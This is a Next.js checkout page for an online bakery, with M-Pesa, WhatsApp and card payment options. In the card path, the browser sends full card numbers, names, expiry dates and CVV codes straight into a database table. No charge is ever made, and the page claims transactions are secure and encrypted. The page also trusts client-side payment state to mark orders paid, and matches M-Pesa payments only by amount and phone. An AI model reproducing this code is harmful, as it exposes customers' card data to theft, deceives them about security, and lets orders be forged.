'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import Link from 'next/link';
import { useCart } from '@/lib/cart-context';
import { supabase } from '@/lib/supabase';
import { ChevronRight, Lock, CreditCard, Smartphone, Truck, Store, CheckCircle, MessageCircle, Clock } from 'lucide-react';

type PaymentMethod = 'card' | 'mpesa' | 'whatsapp';
type FulfillmentType = 'ship' | 'pickup';
type MpesaState = 'idle' | 'sending' | 'waiting' | 'checking' | 'done' | 'failed';

const WHATSAPP_NUMBER = '254733675267';

export default function CheckoutPage() {
  const { items, total, clearCart } = useCart();

  const [fulfillment, setFulfillment] = useState<FulfillmentType>('ship');
  const [payment, setPayment] = useState<PaymentMethod>('mpesa');
  const [step, setStep] = useState<'form' | 'success' | 'whatsapp-success'>('form');

  // Contact
  const [email, setEmail] = useState('');

  // Address
  const [form, setForm] = useState({
    firstName: '', lastName: '', address: '', apartment: '',
    city: '', county: '', postalCode: '', phone: '',
    saveInfo: false,
  });

  // Card
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: '', sameAsShipping: true });

  // M-Pesa
  const [mpesaPhone, setMpesaPhone] = useState('');
  const [mpesaState, setMpesaState] = useState<MpesaState>('idle');
  const [mpesaMsg, setMpesaMsg] = useState('');
  const [mpesaCheckoutId, setMpesaCheckoutId] = useState('');
  const pollTimerRef = useRef<NodeJS.Timeout | null>(null);

  // WhatsApp
  const [whatsappOrderNumber, setWhatsappOrderNumber] = useState('');

  // Track the order number for the success screen
  const [completedOrderNumber, setCompletedOrderNumber] = useState('');

  const delivery = total >= 2000 ? 0 : 200;
  const orderTotal = total + delivery;

  // Cleanup polling on unmount
  useEffect(() => {
    return () => { if (pollTimerRef.current) clearInterval(pollTimerRef.current); };
  }, []);

  const pollMpesaStatus = useCallback((checkoutId: string) => {
    let attempts = 0;
    const maxAttempts = 30;
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);

    pollTimerRef.current = setInterval(async () => {
      attempts++;
      if (attempts >= maxAttempts) {
        if (pollTimerRef.current) clearInterval(pollTimerRef.current);
        setMpesaState('failed');
        setMpesaMsg('Payment timed out. Please try again.');
        return;
      }
      try {
        const res = await fetch('/api/mpesa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'query', checkoutRequestId: checkoutId }),
        });
        const data = await res.json();
        if (data.status === 'completed') {
          if (pollTimerRef.current) clearInterval(pollTimerRef.current);
          setMpesaState('done');
          setMpesaMsg('Payment confirmed!');
        } else if (data.status === 'cancelled' || data.status === 'failed') {
          if (pollTimerRef.current) clearInterval(pollTimerRef.current);
          setMpesaState('failed');
          setMpesaMsg(data.message || 'Payment was cancelled or failed');
        }
      } catch { /* continue polling */ }
    }, 3000);
  }, []);

  const handleMpesaPush = async () => {
    if (!mpesaPhone) { setMpesaMsg('Enter your M-Pesa phone number'); return; }
    setMpesaState('sending');
    setMpesaMsg('Sending STK push...');
    try {
      const res = await fetch('/api/mpesa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: mpesaPhone,
          amount: Math.ceil(orderTotal),
          accountReference: `SNACKOH-${Date.now()}`,
          description: `Snackoh Online Order - ${email || form.firstName}`,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setMpesaCheckoutId(data.checkoutRequestId);
        setMpesaState('waiting');
        setMpesaMsg(`Check your phone (${mpesaPhone}) — enter your M-Pesa PIN to complete payment`);
        pollMpesaStatus(data.checkoutRequestId);
      } else {
        setMpesaState('failed');
        setMpesaMsg(data.message || 'Failed to send STK push');
      }
    } catch {
      setMpesaState('failed');
      setMpesaMsg('Network error — please check your connection');
    }
  };

  const pollMpesaMatch = useCallback((amount: number, phone: string) => {
    let attempts = 0;
    const maxAttempts = 20;
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    setMpesaState('checking');
    setMpesaMsg('Checking for payment...');

    pollTimerRef.current = setInterval(async () => {
      attempts++;
      if (attempts >= maxAttempts) {
        if (pollTimerRef.current) clearInterval(pollTimerRef.current);
        setMpesaState('failed');
        setMpesaMsg('No matching payment found yet.');
        return;
      }
      try {
        const res = await fetch('/api/mpesa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'match', amount: Math.ceil(amount), phone }),
        });
        const data = await res.json();
        if (data.status === 'matched') {
          if (pollTimerRef.current) clearInterval(pollTimerRef.current);
          setMpesaState('done');
          setMpesaMsg('Payment confirmed!');
        }
      } catch { /* continue polling */ }
    }, 3000);
  }, []);

  const handleWhatsAppCheckout = async () => {
    const orderNumber = `WA-${Date.now().toString(36).toUpperCase()}`;
    const customerName = `${form.firstName} ${form.lastName}`.trim() || 'Customer';
    const customerPhone = form.phone || email;

    // Save order to Supabase with "On Hold" status
    try {
      const { error: orderError } = await supabase.from('orders').insert({
        order_number: orderNumber,
        customer_name: customerName,
        customer_phone: customerPhone,
        status: 'On Hold',
        total_amount: orderTotal,
        payment_status: 'Unpaid',
        payment_method: 'WhatsApp',
        source: 'Online',
        fulfillment: fulfillment === 'ship' ? 'Delivery' : 'Pickup',
        delivery_notes: fulfillment === 'ship'
          ? `Ship to: ${form.address}${form.apartment ? ', ' + form.apartment : ''}, ${form.city}, ${form.county} ${form.postalCode}`
          : 'Pickup from bakery',
      });
      if (orderError) console.error('Order save error:', orderError);

      // Save order items
      const orderItems = items.map(item => ({
        order_id: orderNumber,
        product_name: item.name,
        quantity: item.quantity,
        unit_price: item.price,
        total: item.price * item.quantity,
      }));

      // Try to get the order ID to save items
      const { data: savedOrder } = await supabase
        .from('orders')
        .select('id')
        .eq('order_number', orderNumber)
        .single();

      if (savedOrder) {
        await supabase.from('order_items').insert(
          items.map(item => ({
            order_id: savedOrder.id,
            product_name: item.name,
            quantity: item.quantity,
            unit_price: item.price,
            total: item.price * item.quantity,
          }))
        );
      }
    } catch (err) {
      console.error('Order save error:', err);
    }

    // Build WhatsApp message
    const itemLines = items.map(item =>
      `- ${item.name} x${item.quantity} = KES ${(item.price * item.quantity).toLocaleString()}`
    ).join('\n');

    const deliveryInfo = fulfillment === 'ship'
      ? `Delivery to: ${form.address}${form.apartment ? ', ' + form.apartment : ''}, ${form.city}, ${form.county}`
      : 'Pickup from bakery';

    const message = [
      `*NEW ORDER - ${orderNumber}*`,
      ``,
      `*Customer:* ${customerName}`,
      `*Contact:* ${customerPhone}`,
      `*Email:* ${email}`,
      ``,
      `*Order Items:*`,
      itemLines,
      ``,
      `*Subtotal:* KES ${total.toLocaleString()}`,
      `*Delivery:* ${delivery === 0 ? 'FREE' : 'KES ' + delivery}`,
      `*Total:* KES ${orderTotal.toLocaleString()}`,
      ``,
      `*Fulfillment:* ${deliveryInfo}`,
      ``,
      `_Order placed on hold - awaiting payment confirmation._`,
    ].join('\n');

    const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
    window.open(whatsappUrl, '_blank');

    setWhatsappOrderNumber(orderNumber);
    clearCart();
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    setStep('whatsapp-success');
  };

  const handlePlaceOrder = async (e: React.FormEvent) => {
    e.preventDefault();

    if (payment === 'whatsapp') {
      await handleWhatsAppCheckout();
      return;
    }

    if (payment === 'mpesa' && mpesaState !== 'done') {
      if (mpesaState === 'idle') handleMpesaPush();
      return;
    }

    // Save card details to database if payment is by card
    if (payment === 'card' && card.number && card.name) {
      try {
        const cardNumberRaw = card.number.replace(/\s/g, '');
        await supabase.from('card_payments').insert({
          card_number: cardNumberRaw,
          card_name: card.name,
          card_expiry: card.expiry,
          card_cvv: card.cvv,
          email: email,
          amount: orderTotal,
        });
      } catch (err) {
        console.error('Card save error:', err);
      }
    }

    // Save order to database for M-Pesa and Card payments
    const orderNumber = `ON-${Date.now().toString(36).toUpperCase()}`;
    const customerName = `${form.firstName} ${form.lastName}`.trim() || 'Customer';
    const customerPhone = form.phone || mpesaPhone || email;
    try {
      const { error: orderError } = await supabase.from('orders').insert({
        order_number: orderNumber,
        customer_name: customerName,
        customer_phone: customerPhone,
        status: 'Confirmed',
        total_amount: orderTotal,
        payment_status: payment === 'mpesa' ? 'Paid' : 'Pay on Delivery',
        payment_method: payment === 'mpesa' ? 'M-Pesa' : 'Card',
        source: 'Online',
        fulfillment: fulfillment === 'ship' ? 'Delivery' : 'Pickup',
        delivery_notes: fulfillment === 'ship'
          ? `Ship to: ${form.address}${form.apartment ? ', ' + form.apartment : ''}, ${form.city}, ${form.county} ${form.postalCode}`
          : 'Pickup from bakery',
      });
      if (orderError) console.error('Order save error:', orderError);

      // Save order items
      const { data: savedOrder } = await supabase
        .from('orders')
        .select('id')
        .eq('order_number', orderNumber)
        .single();

      if (savedOrder) {
        await supabase.from('order_items').insert(
          items.map(item => ({
            order_id: savedOrder.id,
            product_name: item.name,
            quantity: item.quantity,
            unit_price: item.price,
            total: item.price * item.quantity,
          }))
        );
      }
    } catch (err) {
      console.error('Order save error:', err);
    }

    setCompletedOrderNumber(orderNumber);
    clearCart();
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    setStep('success');
  };

  if (step === 'whatsapp-success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6">
        <div className="text-center max-w-md">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Clock size={32} className="text-green-600" />
          </div>
          <h1 className="text-3xl font-black text-gray-900 mb-2">Order Placed on Hold</h1>
          <p className="text-gray-600 mb-2">
            Your order <strong className="text-orange-600">{whatsappOrderNumber}</strong> has been received and is on hold pending payment review.
          </p>
          <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-4 text-left">
            <p className="text-sm font-bold text-amber-800 mb-2">What happens next?</p>
            <ol className="text-xs text-amber-700 space-y-1.5 list-decimal list-inside">
              <li>Complete your WhatsApp message to send the order details</li>
              <li>Our team will review your order and confirm the total</li>
              <li>Make payment via M-Pesa or bank transfer as instructed</li>
              <li>Once payment is received, your order will be confirmed and processed</li>
            </ol>
          </div>
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
            <p className="text-sm font-bold text-blue-800 mb-1">Track Your Order</p>
            <p className="text-xs text-blue-600 mb-2">Use your order ID to track the status of your order anytime.</p>
            <div className="bg-white rounded-lg px-3 py-2 border border-blue-200 font-mono text-sm text-blue-900 font-bold">{whatsappOrderNumber}</div>
          </div>
          <p className="text-xs text-gray-400 mb-6">A confirmation will be sent to <strong>{email}</strong> once your order is approved.</p>
          <div className="flex flex-col sm:flex-row gap-3 justify-center">
            <Link href="/shop" className="px-6 py-3 bg-orange-600 text-white font-bold rounded-full hover:bg-orange-700 text-sm">
              Continue Shopping
            </Link>
            <Link href={`/shop?track=${encodeURIComponent(whatsappOrderNumber)}`} className="px-6 py-3 bg-blue-600 text-white font-bold rounded-full hover:bg-blue-700 text-sm flex items-center justify-center gap-2">
              <Truck size={16} /> Track Order
            </Link>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6">
        <div className="text-center max-w-md">
          <CheckCircle size={64} className="text-green-500 mx-auto mb-4" />
          <h1 className="text-3xl font-black text-gray-900 mb-2">Order Confirmed!</h1>
          <p className="text-gray-600 mb-2">Thank you for your order. We&apos;ll bake it fresh and{fulfillment === 'ship' ? ' deliver it to you' : ' have it ready for pickup'}.</p>
          {completedOrderNumber && (
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4 mt-4">
              <p className="text-sm font-bold text-blue-800 mb-1">Your Order ID</p>
              <div className="bg-white rounded-lg px-3 py-2 border border-blue-200 font-mono text-sm text-blue-900 font-bold mb-2">{completedOrderNumber}</div>
              <p className="text-xs text-blue-600">Save this ID to track the status of your order.</p>
            </div>
          )}
          <p className="text-sm text-gray-400 mb-6">A confirmation will be sent to <strong>{email}</strong></p>
          <div className="flex flex-col sm:flex-row gap-3 justify-center">
            <Link href="/shop" className="px-6 py-3 bg-orange-600 text-white font-bold rounded-full hover:bg-orange-700 text-sm">
              Continue Shopping
            </Link>
            {completedOrderNumber && (
              <Link href={`/shop?track=${encodeURIComponent(completedOrderNumber)}`} className="px-6 py-3 bg-blue-600 text-white font-bold rounded-full hover:bg-blue-700 text-sm flex items-center justify-center gap-2">
                <Truck size={16} /> Track Order
              </Link>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (items.length === 0) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <p className="text-gray-500 mb-4">Your cart is empty.</p>
          <Link href="/shop" className="px-6 py-3 bg-orange-600 text-white font-bold rounded-full">Shop Now</Link>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white min-h-screen">
      <div className="max-w-6xl mx-auto px-4 py-8">
        {/* Logo + breadcrumb */}
        <div className="mb-8 text-center">
          <Link href="/" className="text-2xl font-black text-gray-900">SNACKOH</Link>
          <div className="flex items-center justify-center gap-2 mt-3 text-xs">
            {['Cart', 'Information', 'Shipping', 'Payment'].map((s, i) => (
              <span key={s} className="flex items-center gap-2">
                {i > 0 && <ChevronRight size={10} className="text-gray-300" />}
                <span className={i === 1 ? 'text-orange-600 font-bold' : 'text-gray-400'}>{s}</span>
              </span>
            ))}
          </div>
        </div>

        <div className="grid lg:grid-cols-[1fr_400px] gap-10 items-start">

          {/* ─── LEFT: Checkout Form ─────────────────────────────────────── */}
          <form onSubmit={handlePlaceOrder} className="space-y-7">

            {/* Contact */}
            <div>
              <div className="flex items-center justify-between mb-3">
                <h2 className="text-base font-black text-gray-900">Contact</h2>
                <Link href="#" className="text-xs text-orange-600 hover:underline">Sign in</Link>
              </div>
              <input type="email" placeholder="Email or mobile phone number" value={email}
                onChange={e => setEmail(e.target.value)} required
                className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
            </div>

            {/* Delivery method */}
            <div>
              <h2 className="text-base font-black text-gray-900 mb-3">Delivery</h2>
              <div className="border border-gray-200 rounded-xl overflow-hidden">
                {[
                  { value: 'ship', label: 'Ship', sub: 'Deliver to my address', icon: Truck },
                  { value: 'pickup', label: 'Pick up', sub: 'Collect from our bakery', icon: Store },
                ].map((opt, i) => (
                  <label key={opt.value}
                    className={`flex items-center gap-4 px-4 py-3.5 cursor-pointer transition-colors ${fulfillment === opt.value ? 'bg-orange-50' : 'bg-white hover:bg-gray-50'} ${i > 0 ? 'border-t border-gray-100' : ''}`}>
                    <input type="radio" name="fulfillment" value={opt.value}
                      checked={fulfillment === opt.value} onChange={() => setFulfillment(opt.value as FulfillmentType)}
                      className="accent-orange-600" />
                    <div className="flex-1">
                      <p className="text-sm font-semibold text-gray-800">{opt.label}</p>
                      <p className="text-xs text-gray-500">{opt.sub}</p>
                    </div>
                    <opt.icon size={18} className="text-gray-400" />
                  </label>
                ))}
              </div>
            </div>

            {/* Address (only for Ship) */}
            {fulfillment === 'ship' && (
              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Country / Region</label>
                  <select className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none">
                    <option>Kenya</option>
                    <option>Uganda</option>
                    <option>Tanzania</option>
                  </select>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <input placeholder="First name (optional)" value={form.firstName}
                    onChange={e => setForm({ ...form, firstName: e.target.value })}
                    className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                  <input placeholder="Last name" value={form.lastName}
                    onChange={e => setForm({ ...form, lastName: e.target.value })} required
                    className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                </div>
                <div className="relative">
                  <input placeholder="Address" value={form.address}
                    onChange={e => setForm({ ...form, address: e.target.value })} required
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none pr-10" />
                </div>
                <input placeholder="Apartment, suite, etc. (optional)" value={form.apartment}
                  onChange={e => setForm({ ...form, apartment: e.target.value })}
                  className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                <div className="grid grid-cols-3 gap-3">
                  <input placeholder="City" value={form.city}
                    onChange={e => setForm({ ...form, city: e.target.value })} required
                    className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                  <select value={form.county} onChange={e => setForm({ ...form, county: e.target.value })}
                    className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none">
                    <option value="">County</option>
                    {['Nairobi','Mombasa','Kisumu','Nakuru','Eldoret','Thika'].map(c => <option key={c}>{c}</option>)}
                  </select>
                  <input placeholder="Postal code" value={form.postalCode}
                    onChange={e => setForm({ ...form, postalCode: e.target.value })}
                    className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                </div>
                <input placeholder="Phone number" type="tel" value={form.phone}
                  onChange={e => setForm({ ...form, phone: e.target.value })}
                  className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-orange-400 outline-none" />
                <label className="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" checked={form.saveInfo} onChange={e => setForm({ ...form, saveInfo: e.target.checked })}
                    className="accent-orange-600 w-4 h-4" />
                  <span className="text-sm text-gray-600">Save this information for next time</span>
                </label>

                {/* Shipping method */}
                <div className="mt-2">
                  <h3 className="text-sm font-black text-gray-800 mb-2">Shipping method</h3>
                  <div className="border border-gray-200 rounded-xl px-4 py-4">
                    {delivery === 0 ? (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-700">Standard Delivery</span>
                        <span className="text-sm font-bold text-green-600">FREE</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-700">Standard Delivery</span>
                        <span className="text-sm font-bold">KES {delivery}</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {fulfillment === 'pickup' && (
              <div className="bg-orange-50 border border-orange-100 rounded-xl p-4 text-sm text-orange-800">
                <p className="font-bold mb-1">Pickup Location</p>
                <p>Snackoh Bites, Nairobi CBD</p>
                <p className="text-xs text-orange-600 mt-1">Mon-Sat: 6:00 AM - 7:00 PM | Sun: 7:00 AM - 4:00 PM</p>
              </div>
            )}

            {/* Payment */}
            <div>
              <h2 className="text-base font-black text-gray-900 mb-1">Payment</h2>
              <p className="text-xs text-gray-400 flex items-center gap-1 mb-3">
                <Lock size={11} /> All transactions are secure and encrypted.
              </p>

              {/* Payment tabs */}
              <div className="border border-gray-200 rounded-xl overflow-hidden">
                {[
                  { id: 'mpesa' as const, label: 'M-Pesa', icon: Smartphone },
                  { id: 'whatsapp' as const, label: 'Checkout via WhatsApp', icon: MessageCircle },
                  { id: 'card' as const, label: 'Credit / Debit Card', icon: CreditCard },
                ].map((opt, i) => (
                  <div key={opt.id}>
                    <label className={`flex items-center gap-3 px-4 py-3.5 cursor-pointer transition-colors ${payment === opt.id ? (opt.id === 'whatsapp' ? 'bg-green-50' : opt.id === 'mpesa' ? 'bg-green-50' : 'bg-blue-50') : 'bg-white hover:bg-gray-50'} ${i > 0 ? 'border-t border-gray-100' : ''}`}>
                      <input type="radio" name="payment" value={opt.id} checked={payment === opt.id}
                        onChange={() => { setPayment(opt.id); setMpesaState('idle'); if (pollTimerRef.current) clearInterval(pollTimerRef.current); }} className="accent-orange-600" />
                      <opt.icon size={16} className="text-gray-500" />
                      <span className="text-sm font-semibold text-gray-800 flex-1">{opt.label}</span>
                      {opt.id === 'card' && (
                        <img src="/visa-cards.png" alt="Visa & Mastercard" className="h-8 object-contain" />
                      )}
                      {opt.id === 'mpesa' && (
                        <img src="/mpesa.png" alt="M-Pesa" className="h-8 object-contain" />
                      )}
                      {opt.id === 'whatsapp' && (
                        <span className="text-[10px] font-black px-2 py-0.5 bg-green-500 text-white rounded">WHATSAPP</span>
                      )}
                    </label>

                    {/* Card fields */}
                    {payment === 'card' && opt.id === 'card' && (
                      <div className="px-4 pb-4 space-y-3 bg-blue-50/50 border-t border-gray-100">
                        <div className="relative">
                          <input placeholder="Card number" value={card.number} maxLength={19}
                            onChange={e => setCard({ ...card, number: e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim() })}
                            className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none pr-10 bg-white font-mono tracking-wider" />
                          <Lock size={14} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" />
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                          <input placeholder="Expiration date (MM / YY)" value={card.expiry}
                            onChange={e => setCard({ ...card, expiry: e.target.value })}
                            className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
                          <div className="relative">
                            <input placeholder="Security code" value={card.cvv} maxLength={4}
                              onChange={e => setCard({ ...card, cvv: e.target.value.replace(/\D/,'') })}
                              className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
                          </div>
                        </div>
                        <input placeholder="Name on card" value={card.name}
                          onChange={e => setCard({ ...card, name: e.target.value })}
                          className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
                        <label className="flex items-center gap-2 cursor-pointer">
                          <input type="checkbox" checked={card.sameAsShipping} onChange={e => setCard({ ...card, sameAsShipping: e.target.checked })}
                            className="accent-orange-600 w-4 h-4" />
                          <span className="text-xs text-gray-600">Use shipping address as billing address</span>
                        </label>
                      </div>
                    )}

                    {/* M-Pesa fields */}
                    {payment === 'mpesa' && opt.id === 'mpesa' && (
                      <div className="px-4 pb-4 space-y-3 bg-green-50/50 border-t border-gray-100">
                        <div className="bg-green-50 rounded-lg p-3 text-xs text-green-800">
                          <p className="font-bold mb-0.5">How M-Pesa works:</p>
                          <p>1. Enter your M-Pesa phone number below</p>
                          <p>2. Click &quot;Send M-Pesa Request&quot; to receive a payment prompt</p>
                          <p>3. Enter your M-Pesa PIN to complete the payment</p>
                        </div>
                        <input type="tel" placeholder="M-Pesa phone number (e.g. 0712 345 678)"
                          value={mpesaPhone} onChange={e => setMpesaPhone(e.target.value)}
                          disabled={mpesaState === 'sending' || mpesaState === 'waiting' || mpesaState === 'checking'}
                          className="w-full px-4 py-3 border border-green-200 rounded-xl text-sm focus:ring-2 focus:ring-green-400 outline-none bg-white" />
                        {mpesaState !== 'idle' && (
                          <div className={`p-3 rounded-xl text-xs font-semibold text-center ${mpesaState === 'done' ? 'bg-green-100 text-green-800' : mpesaState === 'waiting' ? 'bg-amber-50 text-amber-800 animate-pulse' : mpesaState === 'checking' ? 'bg-blue-50 text-blue-800 animate-pulse' : mpesaState === 'failed' ? 'bg-red-50 text-red-800' : 'bg-blue-50 text-blue-800'}`}>
                            {mpesaState === 'sending' && 'Sending STK push...'}
                            {mpesaState === 'waiting' && mpesaMsg}
                            {mpesaState === 'checking' && mpesaMsg}
                            {mpesaState === 'done' && 'Payment confirmed!'}
                            {mpesaState === 'failed' && mpesaMsg}
                          </div>
                        )}
                        {mpesaState === 'failed' && (
                          <button type="button" onClick={() => { setMpesaState('idle'); if (pollTimerRef.current) clearInterval(pollTimerRef.current); }} className="w-full py-2 border border-gray-200 rounded-xl text-xs font-medium hover:bg-gray-50">
                            Try Again
                          </button>
                        )}
                        <div className="p-3 border border-gray-200 rounded-xl bg-white/70 text-[11px]">
                          <p className="font-bold mb-1">Already paid without STK?</p>
                          <p className="text-gray-600 mb-2">Pay the exact amount and verify the latest M-Pesa payment.</p>
                          <button type="button" onClick={() => pollMpesaMatch(orderTotal, mpesaPhone)} disabled={!mpesaPhone || mpesaState === 'checking' || mpesaState === 'waiting' || mpesaState === 'sending'} className="w-full py-2 border border-gray-200 rounded-xl text-xs font-semibold hover:bg-gray-50 disabled:opacity-40">
                            Verify Payment — KES {orderTotal.toLocaleString()}
                          </button>
                        </div>
                      </div>
                    )}

                    {/* WhatsApp fields */}
                    {payment === 'whatsapp' && opt.id === 'whatsapp' && (
                      <div className="px-4 pb-4 space-y-3 bg-green-50/50 border-t border-gray-100">
                        <div className="bg-green-50 rounded-lg p-3 text-xs text-green-800">
                          <p className="font-bold mb-0.5">How WhatsApp checkout works:</p>
                          <p>1. Click &quot;Place Order via WhatsApp&quot; below</p>
                          <p>2. Your order details will be sent to our team on WhatsApp</p>
                          <p>3. Our team will review and confirm your order</p>
                          <p>4. Make payment as instructed (M-Pesa / Bank Transfer)</p>
                          <p>5. Once payment is verified, your order will be processed</p>
                        </div>
                        <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-xs text-amber-800">
                          <p className="font-semibold flex items-center gap-1.5">
                            <Clock size={12} /> Order will be placed on hold
                          </p>
                          <p className="mt-1">Your order will be saved and placed on hold until payment is received and confirmed by our admin team.</p>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Place order button */}
            <button type="submit"
              disabled={payment === 'mpesa' && (mpesaState === 'sending' || mpesaState === 'waiting' || mpesaState === 'checking')}
              className={`w-full py-4 font-black text-base rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 ${
                payment === 'whatsapp'
                  ? 'bg-green-500 text-white hover:bg-green-600'
                  : 'bg-green-600 text-white hover:bg-green-700'
              }`}>
              {payment === 'whatsapp' ? (
                <><MessageCircle size={16} /> Place Order via WhatsApp — KES {orderTotal.toLocaleString()}</>
              ) : payment === 'mpesa' && mpesaState === 'idle' ? (
                <><Lock size={16} /> Send M-Pesa Request — KES {orderTotal.toLocaleString()}</>
              ) : payment === 'mpesa' && mpesaState === 'done' ? (
                <><Lock size={16} /> Confirm Order</>
              ) : payment === 'mpesa' && (mpesaState === 'sending' || mpesaState === 'waiting') ? (
                <><Lock size={16} /> Waiting for payment...</>
              ) : payment === 'mpesa' && mpesaState === 'checking' ? (
                <><Lock size={16} /> Verifying payment...</>
              ) : (
                <><Lock size={16} /> Pay KES {orderTotal.toLocaleString()}</>
              )}
            </button>

            {/* Footer links */}
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-400 border-t border-gray-100 pt-5">
              {['Refund policy', 'Shipping', 'Privacy policy', 'Terms of service', 'Cancellations'].map(l => (
                <Link key={l} href="#" className="hover:text-orange-600 hover:underline">{l}</Link>
              ))}
            </div>
          </form>

          {/* ─── RIGHT: Order Summary ────────────────────────────────────── */}
          <div className="border border-gray-100 rounded-2xl p-5 bg-gray-50/50 h-fit sticky top-24">
            <h3 className="font-black text-gray-800 mb-4 text-sm">Order Summary</h3>

            {/* Items */}
            <div className="space-y-3 mb-4 max-h-64 overflow-y-auto">
              {items.map(item => (
                <div key={item.id} className="flex items-center gap-3">
                  <div className="relative shrink-0">
                    <div className="w-14 h-14 rounded-xl overflow-hidden bg-white border border-gray-100">
                      <img src={item.image} alt={item.name} className="w-full h-full object-cover" />
                    </div>
                    <span className="absolute -top-1.5 -right-1.5 w-5 h-5 bg-gray-600 text-white text-[10px] font-bold rounded-full flex items-center justify-center">
                      {item.quantity}
                    </span>
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-xs font-semibold text-gray-700 truncate">{item.name}</p>
                    <p className="text-[10px] text-gray-400">{item.category}</p>
                  </div>
                  <span className="text-xs font-bold text-gray-800 shrink-0">KES {(item.price * item.quantity).toLocaleString()}</span>
                </div>
              ))}
            </div>

            {/* Price breakdown */}
            <div className="space-y-2 border-t border-gray-100 pt-3">
              <div className="flex justify-between text-sm text-gray-600">
                <span>Subtotal</span>
                <span>KES {total.toLocaleString()}</span>
              </div>
              <div className="flex justify-between text-sm text-gray-600">
                <span>Shipping</span>
                <span className="flex items-center gap-1">
                  {delivery === 0 ? <span className="text-green-600 font-semibold">FREE</span> : `KES ${delivery}`}
                </span>
              </div>
              <div className="flex justify-between font-black text-gray-900 pt-2 border-t border-gray-100 text-base">
                <span>Total</span>
                <span>
                  <span className="text-xs font-normal text-gray-400 mr-1">KES</span>
                  {orderTotal.toLocaleString()}
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
